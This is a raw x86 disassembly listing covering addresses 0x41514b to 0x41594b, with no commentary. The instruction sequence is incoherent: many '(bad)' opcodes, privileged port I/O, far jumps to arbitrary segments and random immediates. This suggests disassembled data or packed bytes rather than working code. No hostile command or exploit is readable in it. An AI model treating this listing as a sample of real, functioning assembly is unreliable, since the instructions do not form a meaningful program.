  41514b:	repnz data16 add BYTE PTR [edx+0x3196a116],cl
  415153:	xchg   ebp,ebp
  415155:	test   al,0xf3
  415157:	out    0x28,eax
  415159:	clc    
  41515a:	sbb    eax,0xf43815bd
  41515f:	mov    ch,0xc3
  415161:	xchg   edx,eax
  415162:	gs call 0xaa28:0xc30a94ad
  41516a:	mov    al,ds:0x3b04de41
  41516f:	cmp    eax,0x68109e31
  415174:	jb     0x415102
  415176:	xor    esi,ebp
  415178:	repnz and eax,0xab264ab9
  41517e:	dec    ebp
  41517f:	dec    ecx
  415180:	bound  esi,QWORD PTR [edi+0x3932b692]
  415186:	in     al,0x8e
  415188:	cmp    ah,BYTE PTR [eax]
  41518a:	cwde   
  41518b:	mov    esi,0x43dde634
  415190:	cmp    ebx,DWORD PTR [edx+0x52]
  415193:	xor    DWORD PTR [esp+eax*4],edx
  415196:	xchg   esi,eax
  415197:	and    dh,BYTE PTR [ebp-0x18]
  41519a:	jle    0x4151db
  41519c:	ins    DWORD PTR es:[edi],dx
  41519d:	xchg   BYTE PTR [esi-0x6],dl
  4151a0:	(bad)  
  4151a1:	pop    ss
  4151a2:	out    dx,al
  4151a3:	fmul   QWORD PTR [edi]
  4151a5:	mov    ah,0x23
  4151a7:	or     BYTE PTR [esi+0x5b7863f4],ch
  4151ad:	add    al,0x6f
  4151af:	repnz fist DWORD PTR ds:0x150342b7
  4151b6:	sbb    esi,DWORD PTR [esi]
  4151b8:	(bad)  
  4151b9:	into   
  4151ba:	mov    bh,0x4d
  4151bc:	dec    ebx
  4151bd:	popa   
  4151be:	inc    edi
  4151bf:	ins    DWORD PTR es:[edi],dx
  4151c0:	push   edi
  4151c1:	mov    dh,0xfb
  4151c3:	popa   
  4151c4:	sbb    BYTE PTR [esi+0xf],0x74
  4151c8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4151c9:	push   ecx
  4151ca:	sbb    eax,DWORD PTR es:[esi+0x4d]
  4151ce:	adc    eax,0xc25f9b89
  4151d3:	lods   eax,DWORD PTR ds:[esi]
  4151d4:	out    0x40,al
  4151d6:	mov    DWORD PTR [ebp*8+0x5f1febf5],ebp
  4151dd:	int3   
  4151de:	or     BYTE PTR [ecx],bl
  4151e0:	pop    ds
  4151e1:	jnp    0x4151ed
  4151e3:	mov    esi,0x686de1a4
  4151e8:	push   edx
  4151e9:	mov    ecx,DWORD PTR [edx]
  4151eb:	bound  eax,QWORD PTR [edi+0x50]
  4151ee:	jne    0x41526b
  4151f0:	stos   DWORD PTR es:[edi],eax
  4151f1:	das    
  4151f2:	push   0xd6dac9e2
  4151f7:	sub    cl,al
  4151f9:	or     eax,0x8e891f81
  4151fe:	xchg   ebp,eax
  4151ff:	dec    ecx
  415200:	aam    0x27
  415202:	jmp    0x4151dd
  415204:	je     0x4151bc
  415206:	std    
  415207:	rcl    BYTE PTR [ecx+0x610d0757],1
  41520d:	arpl   WORD PTR [ecx-0x33],cx
  415210:	sbb    DWORD PTR [edx],esi
  415212:	jmp    0x6ecc1c7c
  415217:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415218:	fbstp  TBYTE PTR [ebp-0x1f2823a2]
  41521e:	inc    ebp
  41521f:	fwait
  415220:	mov    edi,0x5bc5ccd7
  415225:	xor    al,0x56
  415227:	and    eax,0xd081e3b2
  41522c:	call   0x9465:0xbd723e89
  415233:	in     eax,0x4a
  415235:	or     bh,ch
  415237:	xchg   esi,eax
  415238:	out    0x9e,eax
  41523a:	stos   DWORD PTR es:[edi],eax
  41523b:	test   DWORD PTR [esi-0x57],esi
  41523e:	xchg   esp,eax
  41523f:	scas   al,BYTE PTR es:[edi]
  415240:	call   0x76d1a1c7
  415245:	jae    0x415222
  415247:	or     eax,0xd0ff836d
  41524c:	jno    0x4151ee
  41524e:	cmc    
  41524f:	jp     0x415272
  415251:	gs test eax,0x1878db37
  415257:	popa   
  415258:	pop    ebp
  415259:	pop    ebp
  41525a:	or     ch,bh
  41525c:	(bad)  
  41525d:	fidivr DWORD PTR [ebp-0x28]
  415260:	mov    esp,0x8c980b2f
  415265:	gs popf 
  415267:	add    edi,DWORD PTR [edx]
  415269:	cmovp  ebx,eax
  41526c:	dec    eax
  41526d:	pop    ss
  41526e:	iret   
  41526f:	cs data16 fcmovnbe st,st(5)
  415273:	sub    DWORD PTR [eax],esi
  415275:	hlt    
  415276:	pop    esp
  415277:	ror    DWORD PTR [eax+0x6d],cl
  41527a:	sahf   
  41527b:	(bad)  
  41527c:	fs adc eax,0x13a119e4
  415282:	repnz or esi,DWORD PTR [ebx+edx*1-0x7563afc1]
  41528a:	inc    edx
  41528b:	sahf   
  41528c:	into   
  41528d:	xor    al,0xbb
  41528f:	fs test al,0xbc
  415292:	loop   0x41523a
  415294:	pusha  
  415295:	stos   DWORD PTR es:[edi],eax
  415296:	jl     0x415272
  415298:	outs   dx,BYTE PTR ds:[esi]
  415299:	push   esi
  41529a:	and    al,0x18
  41529c:	add    DWORD PTR [ebp-0x5a],0xffffffd9
  4152a0:	mov    fs,WORD PTR [edi+0x563dbf47]
  4152a6:	mov    ebx,0x84c08e4a
  4152ab:	pop    ss
  4152ac:	mov    WORD PTR [ebp+ebp*8-0x2d6155f9],cs
  4152b3:	test   BYTE PTR [ebp-0xe],bl
  4152b6:	adc    DWORD PTR ds:0x6b13ff02,esp
  4152bc:	mov    ebp,0x23b79635
  4152c1:	dec    ecx
  4152c2:	shl    ebx,1
  4152c4:	test   al,0xa8
  4152c6:	jae    0x4152ab
  4152c8:	mov    edx,0x1da2394f
  4152cd:	test   DWORD PTR [esp+ebp*1-0x4b],eax
  4152d1:	xor    ebx,DWORD PTR [esp+eax*1]
  4152d4:	(bad)  
  4152d5:	gs ss shl dh,cl
  4152d9:	cmp    ebp,DWORD PTR [ecx-0x38e6202c]
  4152df:	xor    edi,DWORD PTR [esi+0x49fe8d95]
  4152e5:	ins    DWORD PTR es:[edi],dx
  4152e6:	imul   edx,ebp,0x5f
  4152e9:	scas   eax,DWORD PTR es:[edi]
  4152ea:	add    al,0x4
  4152ec:	jno    0x41534d
  4152ee:	fadd   QWORD PTR es:[eax*2+0x10a4a62c]
  4152f6:	sub    al,0xc
  4152f8:	mov    dl,0xd5
  4152fa:	mov    bp,0xa9a6
  4152fe:	scas   eax,DWORD PTR es:[edi]
  4152ff:	push   cs
  415300:	jmp    0xb32e:0x2a092d88
  415307:	outs   dx,DWORD PTR ds:[esi]
  415308:	cs iret 
  41530a:	pop    ds
  41530b:	outs   dx,BYTE PTR ds:[esi]
  41530c:	clc    
  41530d:	push   ss
  41530e:	scas   eax,DWORD PTR es:[edi]
  41530f:	jge    0x415332
  415311:	imul   ecx,DWORD PTR [eax],0x8047454d
  415317:	iret   
  415318:	lods   al,BYTE PTR ds:[esi]
  415319:	test   ch,0xc7
  41531c:	ins    BYTE PTR es:[edi],dx
  41531d:	pusha  
  41531e:	mov    ch,BYTE PTR [ebx+0xd]
  415321:	mov    ebx,0x2e1b593b
  415326:	sbb    eax,0x88c2db69
  41532b:	rcl    BYTE PTR [ebp+0x1e],0x7a
  41532f:	push   0xcca87ef9
  415334:	mov    eax,ds:0x85f64e33
  41533a:	cmp    esp,ebx
  41533c:	pushf  
  41533d:	cdq    
  41533e:	stos   DWORD PTR es:[edi],eax
  41533f:	mov    eax,ds:0x284ef959
  415344:	lods   eax,DWORD PTR ds:[esi]
  415345:	sti    
  415346:	xor    al,ah
  415348:	aam    0xc6
  41534a:	adc    ebx,0x91015467
  415350:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415351:	add    bl,BYTE PTR [ebp-0x73]
  415354:	ror    BYTE PTR [esi+0x5b],1
  415357:	mov    esi,0x6a4d8bc8
  41535c:	or     dl,BYTE PTR [ebx]
  41535e:	sbb    dl,BYTE PTR [ecx+0x68]
  415361:	push   cs
  415362:	sub    eax,DWORD PTR ds:0x559178b9
  415368:	cmp    DWORD PTR [edi-0x49af0b04],ecx
  41536e:	scas   eax,DWORD PTR es:[edi]
  41536f:	inc    esp
  415370:	pop    esi
  415371:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415372:	(bad)  
  415373:	neg    BYTE PTR [ebx]
  415375:	dec    eax
  415376:	nop
  415377:	aas    
  415378:	fistp  QWORD PTR [edx+0x52]
  41537b:	xor    esp,edi
  41537d:	or     BYTE PTR [edi+0x682785a5],0x95
  415384:	je     0x415382
  415386:	scas   al,BYTE PTR es:[edi]
  415387:	or     eax,0xa620019d
  41538c:	lods   al,BYTE PTR ds:[esi]
  41538d:	std    
  41538e:	bound  ecx,QWORD PTR ds:0xe8f98bbc
  415394:	and    eax,DWORD PTR [esi+ebx*2-0x1aa44ddc]
  41539b:	xchg   edi,eax
  41539c:	pop    ds
  41539d:	cdq    
  41539e:	xor    BYTE PTR [edx+0x3aa566d2],0x92
  4153a5:	add    edi,DWORD PTR [edx+ebx*2-0x1a]
  4153a9:	adc    BYTE PTR [esi],ah
  4153ab:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4153ac:	cmc    
  4153ad:	mov    ds:0x3c209c0d,eax
  4153b2:	out    dx,eax
  4153b3:	ror    BYTE PTR [ebp-0x47df27f7],1
  4153b9:	or     eax,0x5dca5075
  4153be:	pop    eax
  4153bf:	inc    ebp
  4153c0:	push   ebp
  4153c1:	and    esi,ebp
  4153c3:	cs push eax
  4153c5:	rcr    BYTE PTR [eax+0x5915bff2],cl
  4153cb:	adc    BYTE PTR [ecx],dl
  4153cd:	push   edi
  4153ce:	rol    BYTE PTR [edi-0x57],0xac
  4153d2:	push   0x8d33c0ea
  4153d7:	aaa    
  4153d8:	and    DWORD PTR [edx+0x9],0xe427ff46
  4153df:	rcl    DWORD PTR [edx+0x3610d635],cl
  4153e5:	fst    DWORD PTR [ebx]
  4153e7:	jns    0x415414
  4153e9:	sar    DWORD PTR [ecx],cl
  4153eb:	mov    cl,0x66
  4153ed:	mov    al,ds:0x2f04866d
  4153f2:	jnp    0x415421
  4153f4:	xchg   ebp,eax
  4153f5:	jb     0x41543b
  4153f7:	xchg   esi,eax
  4153f8:	add    esp,ebp
  4153fa:	mov    al,0x9e
  4153fc:	dec    ebx
  4153fd:	loopne 0x4153b1
  4153ff:	xchg   esi,eax
  415400:	or     BYTE PTR [edx],cl
  415402:	sbb    BYTE PTR [edx-0x1d],ah
  415405:	lock pop ebx
  415407:	jg     0x415410
  415409:	pop    es
  41540a:	dec    esp
  41540b:	out    dx,al
  41540c:	push   ss
  41540d:	xor    eax,0x7aec0134
  415412:	or     BYTE PTR [ebp+0x3e3014db],0xc6
  415419:	mov    eax,0x10df46bc
  41541e:	out    dx,eax
  41541f:	loop   0x415484
  415421:	xchg   ebp,eax
  415422:	retf   
  415423:	and    BYTE PTR [edi-0x57],dh
  415426:	(bad)  
  415428:	inc    esp
  415429:	scas   al,BYTE PTR es:[edi]
  41542a:	and    eax,0x8fe5fe44
  41542f:	mov    al,ds:0x535a59e7
  415434:	inc    esp
  415435:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415436:	fst    DWORD PTR [eax-0x1d]
  415439:	inc    ebp
  41543a:	rol    ch,cl
  41543c:	push   esp
  41543d:	jnp    0x4153ca
  41543f:	jmp    0x7b0cc6b4
  415444:	jns    0x41546f
  415446:	pop    ecx
  415447:	mov    ch,0xef
  415449:	xor    dl,ch
  41544b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41544c:	xchg   BYTE PTR [ecx],ah
  41544e:	gs push ebx
  415450:	push   ss
  415451:	mov    ds:0x150b7bc0,eax
  415456:	fmul   st(4),st
  415458:	and    DWORD PTR [ebx+0x30],ebx
  41545b:	mov    ds:0x69b6b553,al
  415460:	fsubr  st(1),st
  415462:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415463:	leave  
  415464:	repnz retf 0x4b82
  415468:	adc    esi,eax
  41546a:	scas   eax,DWORD PTR es:[edi]
  41546b:	mov    esp,0xebd61bb5
  415470:	je     0x415481
  415472:	and    eax,0x4038f27
  415477:	aas    
  415478:	pop    ebx
  415479:	loopne 0x415413
  41547b:	repnz ror DWORD PTR [ecx+0x4],cl
  41547f:	add    al,0x21
  415481:	daa    
  415482:	and    al,0x23
  415484:	aam    0xf8
  415486:	gs pop edi
  415488:	mov    eax,ds:0x1ef534f5
  41548d:	push   cs
  41548e:	das    
  41548f:	push   ebx
  415490:	ins    BYTE PTR es:[edi],dx
  415491:	fucomp st(7)
  415493:	cmp    bl,BYTE PTR [eax]
  415495:	(bad)  
  415496:	jae    0x41550a
  415498:	xchg   DWORD PTR [edi],edi
  41549a:	add    al,0xb4
  41549c:	lds    ebp,FWORD PTR [esi-0x4]
  41549f:	mov    DWORD PTR [esi-0x23bfbb8],esp
  4154a5:	or     esp,DWORD PTR [edx+esi*4+0x7c6c6172]
  4154ac:	dec    ecx
  4154ad:	sbb    BYTE PTR [esi-0x6e],dh
  4154b0:	test   BYTE PTR [eax-0x4e3129eb],dl
  4154b6:	inc    ebx
  4154b7:	aad    0xf4
  4154b9:	cmc    
  4154ba:	(bad)  
  4154bb:	xchg   ebp,eax
  4154bc:	loop   0x4154d7
  4154be:	mov    ah,0xf8
  4154c0:	stc    
  4154c1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4154c2:	or     eax,0x8d01c3d3
  4154c7:	mov    ebx,0x604478b3
  4154cc:	out    dx,al
  4154cd:	sbb    al,0x5b
  4154cf:	mov    eax,ds:0xee3e2762
  4154d4:	dec    esi
  4154d5:	cld    
  4154d6:	xchg   ecx,eax
  4154d7:	pushf  
  4154d8:	inc    ecx
  4154d9:	scas   al,BYTE PTR es:[edi]
  4154da:	xor    BYTE PTR [ecx+edi*4],0x5
  4154de:	cmp    al,0x9d
  4154e0:	dec    esi
  4154e1:	xchg   ecx,eax
  4154e2:	fisub  WORD PTR [edi]
  4154e4:	or     BYTE PTR [ebp-0x7e],bh
  4154e7:	push   es
  4154e8:	or     dl,BYTE PTR [edi-0x4ff29372]
  4154ee:	xchg   ebp,eax
  4154ef:	and    BYTE PTR [ebx+0x682cb6e7],ch
  4154f5:	cmp    BYTE PTR [eax+eiz*8+0xa],dh
  4154f9:	aam    0x52
  4154fb:	mov    dh,BYTE PTR [ecx+0xf]
  4154fe:	loopne 0x415541
  415500:	push   edx
  415501:	mov    bl,BYTE PTR ds:0xf5b77f88
  415507:	cmp    ebx,ebp
  415509:	jno    0x4154aa
  41550b:	xchg   esp,eax
  41550c:	jg     0x415551
  41550e:	pop    edx
  41550f:	(bad)  
  415510:	sub    DWORD PTR [ecx+0x2e],edi
  415513:	add    DWORD PTR [ebp-0x62a2b870],esp
  415519:	xchg   ebp,eax
  41551a:	jle    0x415596
  41551c:	mov    eax,ds:0x24d3b654
  415521:	mov    edi,0x47fa2715
  415526:	icebp  
  415527:	out    dx,eax
  415528:	in     eax,dx
  415529:	push   edi
  41552a:	or     DWORD PTR [edx+edx*8-0x43],edi
  41552e:	ds hlt 
  415530:	or     al,0x2
  415532:	mov    ah,0xcb
  415534:	pop    ax
  415536:	shr    BYTE PTR gs:[ebx],cl
  415539:	mov    eax,ds:0x6fe0309f
  41553e:	ds xchg esi,eax
  415540:	mov    bl,0xee
  415542:	loope  0x415551
  415544:	test   al,0xea
  415546:	sub    eax,0xc35a6656
  41554b:	xchg   ecx,eax
  41554c:	add    ebp,ebp
  41554e:	arpl   WORD PTR [ecx-0x4a00fafa],si
  415554:	jge    0x41550a
  415556:	pop    edx
  415557:	sub    al,0xe6
  415559:	pop    eax
  41555a:	test   al,0xc8
  41555c:	bound  edx,QWORD PTR [edx+ebx*1+0x1f]
  415560:	retf   
  415561:	cmp    BYTE PTR [eax],ch
  415563:	or     eax,0x2afde755
  415568:	call   0x651424ae
  41556d:	pop    ds
  41556e:	in     eax,0xac
  415570:	imul   esi,DWORD PTR [eax],0x28
  415573:	aad    0x7f
  415575:	pop    ss
  415576:	mov    edi,0x3d4c2261
  41557b:	mov    dl,0xd
  41557d:	loope  0x415531
  41557f:	test   al,0x93
  415581:	and    al,0xd1
  415583:	xchg   ecx,eax
  415584:	jno    0x4155be
  415586:	sti    
  415587:	mov    WORD PTR [ebp+0x77],ds
  41558a:	shr    BYTE PTR [eax-0x1bb5917a],0xe
  415591:	inc    ebp
  415592:	pop    ecx
  415593:	cmp    BYTE PTR [edi+0xca7baed],bh
  415599:	jecxz  0x4155b3
  41559b:	mov    ds:0x83a004c,al
  4155a0:	lahf   
  4155a1:	jecxz  0x41558a
  4155a3:	(bad)  
  4155a4:	lea    edi,[esi-0x78]
  4155a7:	mov    ch,0x59
  4155a9:	and    eax,0xfd1d7c4c
  4155ae:	je     0x41553e
  4155b0:	dec    esi
  4155b1:	adc    ch,cl
  4155b3:	jmp    0x8f98:0x1738ff38
  4155ba:	iret   
  4155bb:	xor    esi,DWORD PTR [ebp*4+0x5b1863f0]
  4155c2:	mov    dh,0xa6
  4155c4:	jmp    0x7c5a:0x1228c5c2
  4155cb:	cmp    al,0xea
  4155cd:	pop    ecx
  4155ce:	repnz in eax,dx
  4155d0:	ss cdq 
  4155d2:	or     al,bl
  4155d4:	popa   
  4155d5:	cmp    BYTE PTR [eax+0x412f0997],al
  4155db:	adc    BYTE PTR [edi],ah
  4155dd:	faddp  st(7),st
  4155df:	pop    esi
  4155e0:	pusha  
  4155e1:	sub    bl,BYTE PTR [edi]
  4155e3:	pop    es
  4155e4:	fnsave ss:[ecx+ebx*8+0x1c2cc193]
  4155ec:	stc    
  4155ed:	loope  0x415618
  4155ef:	aad    0xea
  4155f1:	inc    eax
  4155f2:	(bad)  
  4155f3:	loope  0x41565d
  4155f5:	stos   BYTE PTR es:[edi],al
  4155f6:	call   0xc9549369
  4155fb:	fucomi st,st(5)
  4155fd:	nop
  4155fe:	loope  0x41562f
  415600:	mov    cl,0xc6
  415602:	ja     0x41558b
  415604:	adc    al,0xee
  415606:	pusha  
  415607:	sub    DWORD PTR [ebx-0x45],0x17f4d09e
  41560e:	retf   0xb037
  415611:	xor    DWORD PTR [ecx+0x5d],0x61f8a3ba
  415618:	retf   0xf71e
  41561b:	daa    
  41561c:	out    dx,eax
  41561d:	mov    es,WORD PTR [eax+ebx*2]
  415620:	adc    eax,0x746a46ce
  415625:	data16 mov dl,0xfd
  415628:	popa   
  415629:	cmp    cl,cl
  41562b:	mov    dl,0x85
  41562d:	jb     0x4155c7
  41562f:	mov    es,edx
  415631:	test   ax,0xcee9
  415635:	mov    ecx,0xac3a0696
  41563a:	mov    ecx,0xc238a61a
  41563f:	mov    esp,ebx
  415641:	ss daa 
  415643:	daa    
  415644:	mov    al,ds:0xf640d732
  415649:	in     eax,0xe2
  41564b:	lock mov al,ds:0x9a790133
  415651:	in     al,0xd3
  415653:	(bad)  
  415654:	jl     0x4155ef
  415656:	call   0x56a7:0xbd71c67e
  41565d:	fild   DWORD PTR [ebx-0x6f498b37]
  415663:	dec    ecx
  415664:	dec    BYTE PTR [eax+esi*4]
  415667:	int    0x83
  415669:	into   
  41566a:	mov    ecx,0x8c592256
  41566f:	fld    st(4)
  415671:	sbb    DWORD PTR [eax+ecx*8+0xb],ebp
  415675:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415676:	jge    0x41561e
  415678:	ins    BYTE PTR es:[edi],dx
  415679:	loope  0x415676
  41567b:	lds    edi,FWORD PTR [edi+0x2e59f24]
  415681:	and    BYTE PTR [edx+0x3a],0x4b
  415685:	imul   ecx,DWORD PTR [ebx-0x1ad624ee],0x22
  41568c:	xchg   BYTE PTR [ebp-0x76],ah
  41568f:	xor    BYTE PTR [esi-0x59],ah
  415692:	retf   0x11b7
  415695:	xor    al,0xc4
  415698:	loop   0x4156db
  41569a:	clc    
  41569b:	sub    edx,DWORD PTR [ebp-0x20]
  41569e:	(bad)  
  41569f:	mov    ch,0x1b
  4156a1:	mov    ds:0x9a1cb04f,eax
  4156a6:	sbb    eax,0xc107e68e
  4156ab:	push   0xea1a6749
  4156b0:	xchg   BYTE PTR [esi+esi*8],bh
  4156b3:	ror    DWORD PTR [edi-0x21aefca5],1
  4156b9:	leave  
  4156ba:	add    ebp,DWORD PTR [edx+0x2c]
  4156bd:	mov    ds:0xfc48622a,eax
  4156c2:	and    bh,BYTE PTR [edi]
  4156c4:	add    al,0x37
  4156c6:	je     0x415660
  4156c8:	mov    bl,0xfc
  4156ca:	loopne 0x415723
  4156cc:	add    DWORD PTR [ebx],ebp
  4156ce:	inc    ebx
  4156cf:	call   0x9b7c:0x4cef0fe6
  4156d6:	clc    
  4156d7:	lea    edx,[esi]
  4156d9:	lahf   
  4156da:	jecxz  0x4156f2
  4156dc:	lds    edx,FWORD PTR [esi-0x3d]
  4156df:	pop    edx
  4156e0:	pop    edx
  4156e1:	int3   
  4156e2:	mov    ebp,0x71799204
  4156e7:	jmp    0x95e64177
  4156ec:	push   es
  4156ed:	ds inc ebp
  4156ef:	gs ss cwd 
  4156f3:	and    edi,DWORD PTR [ecx+ebp*8-0x49d383e8]
  4156fa:	jmp    0x389:0x6bd0878f
  415701:	mov    WORD PTR [ebx],es
  415703:	add    BYTE PTR [ebp+edx*4-0x31],dl
  415707:	push   DWORD PTR [eax+ecx*4-0x1f62d8c7]
  41570e:	(bad)  
  41570f:	xchg   ebp,eax
  415710:	fsubr  DWORD PTR [esi]
  415712:	lods   eax,DWORD PTR ds:[esi]
  415713:	test   al,0x2f
  415715:	mov    DWORD PTR [esi+0x52],0x9071b923
  41571c:	pop    ss
  41571d:	rcl    DWORD PTR [edi-0x45a59f74],1
  415723:	xchg   edx,eax
  415724:	sbb    DWORD PTR [eax+0x40],esp
  415727:	push   0xffffffb2
  415729:	mov    eax,ds:0x59eeb2a8
  41572e:	mov    ebx,0xa9be58d0
  415734:	(bad)  
  415735:	rcr    DWORD PTR ss:[eax+0x79],1
  415739:	cmc    
  41573a:	rcl    BYTE PTR [ecx],0xe6
  41573d:	ror    ch,0xba
  415740:	and    eax,0x4fab706c
  415745:	and    DWORD PTR [edi],esi
  415747:	(bad)  
  415749:	leave  
  41574a:	mov    edx,gs
  41574c:	fwait
  41574d:	sbb    bl,ch
  41574f:	jnp    0x4156e4
  415751:	mov    al,0xf4
  415753:	cmp    DWORD PTR [eax],edi
  415755:	jb     0x4157a4
  415757:	mov    eax,0xe33c789b
  41575c:	sbb    eax,0x1aae1d01
  415761:	jecxz  0x41576d
  415763:	bound  edx,QWORD PTR [ecx+edx*8+0x4abe677e]
  41576a:	fsubr  QWORD PTR cs:[esp+eax*2]
  41576e:	mov    ds:0xf5934130,al
  415773:	add    eax,0x9bfb0f61
  415778:	sbb    edx,DWORD PTR [ebx]
  41577a:	outs   dx,BYTE PTR ds:[esi]
  41577b:	xchg   ecx,eax
  41577c:	mov    ebp,0x8c4322e6
  415781:	cmp    esi,DWORD PTR [edx-0x3dae5a71]
  415787:	shl    BYTE PTR [esp+esi*4],1
  41578a:	enter  0x4103,0xe5
  41578e:	pop    edi
  41578f:	xor    BYTE PTR [esi-0x5d],0xf2
  415793:	cmp    DWORD PTR [eax+0x649dc194],edi
  415799:	pushf  
  41579a:	xor    eax,0x7442e29a
  41579f:	cmp    BYTE PTR [ebp+0x33f7fcc8],bh
  4157a5:	fprem1 
  4157a7:	mov    dl,0x61
  4157a9:	push   ds
  4157aa:	mov    dl,0xcd
  4157ac:	int3   
  4157ad:	mov    dl,0x72
  4157af:	sub    al,BYTE PTR [edi-0x2a8f3def]
  4157b5:	cld    
  4157b6:	fwait
  4157b7:	dec    ebx
  4157b8:	ja     0x4157ad
  4157ba:	in     al,0x3
  4157bc:	mov    eax,0x6604d69e
  4157c1:	inc    ecx
  4157c2:	out    dx,al
  4157c3:	leave  
  4157c4:	clc    
  4157c5:	pop    eax
  4157c6:	mov    dl,0xc9
  4157c8:	jb     0x4157eb
  4157ca:	dec    edx
  4157cb:	in     al,0xc3
  4157cd:	pop    ss
  4157ce:	out    dx,eax
  4157cf:	inc    eax
  4157d0:	or     cl,bh
  4157d2:	add    eax,0x21f81bcf
  4157d7:	and    al,0xf1
  4157d9:	pop    edi
  4157da:	in     al,dx
  4157db:	sbb    eax,DWORD PTR [ecx-0x4307c3f]
  4157e1:	enter  0xc150,0x1d
  4157e5:	gs mov bh,0x57
  4157e8:	imul   ecx,DWORD PTR [edi],0xffffff80
  4157eb:	fwait
  4157ec:	cmp    BYTE PTR [edx+ecx*4-0x2ab453c1],bl
  4157f3:	ins    DWORD PTR es:[edi],dx
  4157f4:	dec    edx
  4157f6:	add    BYTE PTR [edx-0x6e91b71d],cl
  4157fc:	jnp    0x4157e2
  4157fe:	mov    al,BYTE PTR [ebp-0x5ea075ec]
  415804:	xchg   esi,eax
  415805:	repz scas al,BYTE PTR es:[edi]
  415807:	inc    esp
  415808:	push   cs
  415809:	pop    ecx
  41580a:	sbb    edx,DWORD PTR [edi-0x4f]
  41580d:	xchg   ebx,eax
  41580e:	je     0x415871
  415810:	pop    esi
  415811:	mov    al,BYTE PTR [esi]
  415813:	stos   DWORD PTR es:[edi],eax
  415814:	(bad)  
  415815:	(bad)  
  415816:	repz rcl BYTE PTR [ecx],1
  415819:	ss pushf 
  41581b:	int3   
  41581c:	dec    esi
  41581d:	ret    0xbd52
  415820:	dec    ecx
  415821:	fmul   QWORD PTR [ebx]
  415823:	jecxz  0x415800
  415825:	mov    edx,0x1a479cfc
  41582a:	sub    ebp,DWORD PTR [edi-0x58623d9a]
  415830:	jp     0x41585d
  415832:	sahf   
  415833:	in     al,dx
  415834:	lds    edi,FWORD PTR [ebp+0x28583ae6]
  41583a:	dec    esp
  41583b:	sbb    al,0xd7
  41583d:	aas    
  41583e:	daa    
  41583f:	int    0xf
  415841:	jnp    0x415803
  415843:	mov    esp,0xb454e9ce
  415848:	sbb    ch,BYTE PTR [ecx+0x7c]
  41584b:	jmp    0x4157d6
  41584d:	adc    ah,BYTE PTR [eax]
  41584f:	pop    ecx
  415850:	push   eax
  415851:	xor    BYTE PTR [eax+0x64],ch
  415854:	mov    ebx,0x5d5190fa
  415859:	lds    ecx,FWORD PTR ds:0x711dd44d
  41585f:	xchg   edx,eax
  415860:	dec    eax
  415861:	and    al,0x1b
  415863:	jg     0x4158c4
  415865:	dec    esp
  415866:	mov    ah,0xaf
  415868:	test   al,0x5c
  41586a:	test   eax,0x5f690b30
  41586f:	mov    ds:0xfbf53d1d,eax
  415874:	repnz repz and al,0xb7
  415878:	mov    ebx,0x45ac695
  41587e:	test   BYTE PTR [ebp-0x43],dh
  415881:	jmp    0xfb31:0x9e81925e
  415888:	gs leave 
  41588a:	mov    dl,0xd7
  41588c:	cld    
  41588d:	and    dl,BYTE PTR [esi-0x3fc3951b]
  415893:	bound  esp,QWORD PTR [edx]
  415895:	or     bl,cl
  415897:	mov    eax,0x104d9128
  41589c:	imul   eax,DWORD PTR [eax-0x7d],0xc5c647a6
  4158a3:	ror    BYTE PTR [esp+eax*4+0x41096056],1
  4158aa:	lahf   
  4158ab:	sbb    BYTE PTR [ecx],cl
  4158ad:	pop    ebx
  4158ae:	imul   eax,DWORD PTR [ebx-0x15],0x17
  4158b2:	fs mov ah,0xca
  4158b5:	loop   0x415926
  4158b7:	xchg   edi,eax
  4158b8:	call   0x6df3:0x3bf654f7
  4158bf:	in     al,0xcb
  4158c1:	jge    0x41588b
  4158c3:	mov    dl,dl
  4158c5:	fnsetpm(287 only) 
  4158c7:	enter  0xe007,0x25
  4158cb:	es push es
  4158cd:	scas   eax,DWORD PTR es:[edi]
  4158ce:	(bad)  
  4158cf:	jle    0x41590c
  4158d1:	inc    edi
  4158d2:	push   edi
  4158d3:	ror    DWORD PTR [edx],cl
  4158d5:	add    dl,bl
  4158d7:	arpl   WORD PTR [ecx],cx
  4158d9:	mov    dh,0xa
  4158db:	bound  esp,QWORD PTR [ebx+0x66bb8f3b]
  4158e1:	ss in  al,dx
  4158e3:	inc    eax
  4158e4:	jp     0x4158f8
  4158e6:	xchg   edi,eax
  4158e7:	and    eax,0xf825dc1e
  4158ec:	xor    al,0xa2
  4158ef:	outs   dx,DWORD PTR ds:[esi]
  4158f0:	dec    eax
  4158f1:	cmp    al,0x44
  4158f3:	cmp    bl,al
  4158f5:	out    dx,eax
  4158f6:	cwde   
  4158f7:	jmp    0x70e0:0x5e3e2339
  4158fe:	xor    DWORD PTR [ecx-0x4d],0x7e
  415902:	pop    ebp
  415903:	stos   BYTE PTR es:[edi],al
  415904:	cmp    dh,bh
  415906:	das    
  415907:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415908:	loopne 0x4158a9
  41590a:	imul   esi,DWORD PTR [ecx-0x2a],0xfffffffd
  41590e:	mov    eax,ds:0xb26b9ac3
  415913:	mov    ebp,DWORD PTR [edi-0x195cda89]
  415919:	and    ah,ah
  41591b:	sub    BYTE PTR [edx],dl
  41591d:	inc    ebp
  41591e:	and    eax,DWORD PTR [eax]
  415920:	das    
  415921:	mov    DWORD PTR [ebx+0x1ca0073d],ebp
  415927:	push   ebx
  415928:	dec    BYTE PTR [ebx]
  41592a:	mov    ds:0xe3b9b5fa,al
  41592f:	out    dx,eax
  415930:	or     DWORD PTR [ebx-0x26],0xffffffe0
  415934:	retf   
  415935:	repnz lods al,BYTE PTR ds:[esi]
  415937:	cli    
  415938:	int3   
  415939:	mov    ch,dl
  41593b:	les    edx,FWORD PTR [esi+0x1d]
  41593e:	jne    0x415991
  415940:	cs icebp 
  415942:	into   
  415943:	pop    es
  415944:	adc    ecx,eax
  415946:	jp     0x41595b
  415948:	pop    ebp
  415949:	stos   BYTE PTR es:[edi],al
  41594a:	fwait
  41594b:	aad    0x60
